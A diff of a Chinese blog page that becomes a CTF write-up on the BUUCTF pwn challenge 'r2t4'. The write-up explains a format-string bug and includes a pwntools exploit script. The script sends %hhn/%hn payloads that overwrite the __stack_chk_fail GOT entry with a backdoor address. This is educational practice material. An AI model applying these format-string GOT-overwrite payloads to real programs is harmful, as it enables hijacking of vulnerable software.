@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="/images/favicon.webp">
-  <title>欢迎光临 | -NIYAH-</title>
+  <title>BUUCTF刷题笔记4 | -NIYAH-</title>
   <meta name="author" content="Niyah" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,22 +13,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="Niyah" />
+    <meta name="keywords" content="BUUCTF, CTF, PWN, 格式化字符串" />
   
-  <meta name="description" content="# 关于我 吃饭大学淦饭人一枚 加油啊学PWN的大哥哥 学习网页制作太开心了（写网页对我这个审美很弱的直男来说果敢还是太难了，颜色搭配、图像选择什么的太糟糕了）">
-<meta property="og:type" content="website">
-<meta property="og:title" content="欢迎光临">
-<meta property="og:url" content="http://niyah.cn/about/index.html">
+  <meta name="description" content="格式化字符串常见题型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF刷题笔记4">
+<meta property="og:url" content="http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/index.html">
 <meta property="og:site_name" content="-NIYAH-">
-<meta property="og:description" content="# 关于我 吃饭大学淦饭人一枚 加油啊学PWN的大哥哥 学习网页制作太开心了（写网页对我这个审美很弱的直男来说果敢还是太难了，颜色搭配、图像选择什么的太糟糕了）">
+<meta property="og:description" content="格式化字符串常见题型">
 <meta property="og:locale">
-<meta property="og:image" content="http://niyah.cn/images/favicon.webp">
-<meta property="article:published_time" content="2020-11-30T14:03:54.000Z">
-<meta property="article:modified_time" content="2021-01-20T12:45:27.768Z">
+<meta property="og:image" content="http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/%E5%B0%81%E9%9D%A2.webp">
+<meta property="article:published_time" content="2021-01-30T06:10:27.000Z">
+<meta property="article:modified_time" content="2021-01-30T06:55:04.545Z">
 <meta property="article:author" content="Niyah">
-<meta property="article:tag" content="Niyah">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="格式化字符串">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://niyah.cn/images/favicon.webp">
+<meta name="twitter:image" content="http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/%E5%B0%81%E9%9D%A2.webp">
 <meta name="twitter:site" content="@null">
   
   <!-- 站点验证相关 -->
@@ -115,24 +118,153 @@
                 <div class="row">
                     
         <div id="main">
-            <section id="main" class="col-md-8">
+            <section class="col-md-8">
     <article>
         <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                <h1 class="kratos-entry-title text-center">BUUCTF刷题笔记4</h1>
+                
+                <div class="kratos-post-meta text-center">
+                    <span id="/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/" class="leancloud_visitors" data-flag-title="BUUCTF刷题笔记4">
+                        <i class="fa fa-calendar"></i> 2021-01-30
+                        <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">PWN刷题笔记</a>
+                        <i class="fa fa-user"></i> 作者 Niyah
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            775
+                        
+                        字
+                        
+                            <i class="fa fa-eye"></i> 阅读 <span class="leancloud-visitors-count"></span> 次
+                        
+                    </span>
+                </div>
+            </header>
             <div class="kratos-post-content">
-                <h2 class="title-h2 text-center">欢迎光临</h2>
-                <h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
-<p>吃饭大学淦饭人一枚</p>
-<div class="alert alert-info">加油啊学PWN的大哥哥</div>
-<div class="alert alert-info">学习网页制作太开心了（写网页对我这个审美很弱的直男来说果敢还是太难了，颜色搭配、图像选择什么的太糟糕了）</div>
+                
+                    <div class="kratos-post-inner-toc">
+                        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig2-"><span class="toc-number">1.</span> <span class="toc-text"> r2t4</span></a></li></ol>
+                    </div>
+                
+                <hr />
+                <h2 id="-swig2-"><a class="markdownIt-Anchor" href="#-swig2-">#</a> <div class="alert alert-success">r2t4</div></h2>
+<p>本题是个格式化字符串漏洞</p>
+<p>进入 IDA 进行分析，直接可以看到有一个后门函数可以直接输出 flag，我们只需要调用它就行了</p>
+<p>这题是有 canary 的，但是没有关系，检查 canary 后会执行那个 **__stack_chk_fail** 函数，那么我们利用格式化字符串修改这个函数的地址为后门函数地址就可以输出 flag 了</p>
+<div class="panel panel-TYPE">
+    <div class="panel-title">EXP</div>
+    <div class="panel-body">
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28241</span>)</span><br><span class="line"></span><br><span class="line">jump = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;%6c%10$hhn%32c%11$hhn%26c%12$hhn&#x27;</span>   <span class="comment">#单地址修改payload</span></span><br><span class="line">payload2 = <span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span>      <span class="comment">#双地址修改payload</span></span><br><span class="line"></span><br><span class="line">payload3 = payload1 + p64(jump+<span class="number">1</span>) + p64(jump) +p64(jump+<span class="number">2</span>)</span><br><span class="line">payload4 = payload2 + p64(jump+<span class="number">2</span>)+ p64(jump)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload2)</span><br><span class="line"></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+    </div>
+
             </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
             <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                        <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/";
+            const title         = "「BUUCTF刷题笔记4」";
+            const excerpt       = `格式化字符串常见题型`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
                 <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-none-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-none-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a>
+                    </div>
                     <div class="pull-date">
-                    <span>最后编辑：2021-01-20</span>
+                    <span>最后编辑：2021-01-30</span>
                     </div>
                 </div>
             </footer>
         </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" BUUCTF刷题笔记3" href="/PWN刷题笔记/BUUCTF刷题笔记3/">&lt; 上一篇</a>
+                </div>
+                
+                
+            </nav>
+        
         
             <div id="v-comments" class="post-comments"></div>
 <script type="text/javascript">
@@ -154,7 +286,7 @@
                 appKey: '51wd7rcwQdYtBJ9oRHucwGYm',
                 visitor: true,
                 enableQQ: true,
-                path: '/about/index.html'
+                path: '/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/'
             });
         }
         if (typeof Valine == 'undefined') {
@@ -196,7 +328,7 @@
     </div>
     <div class="textwidget">
         
-            <p class="text-center">Niyah</p>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig2-"><span class="toc-number">1.</span> <span class="toc-text"> r2t4</span></a></li></ol>
         
     </div>
 </aside>
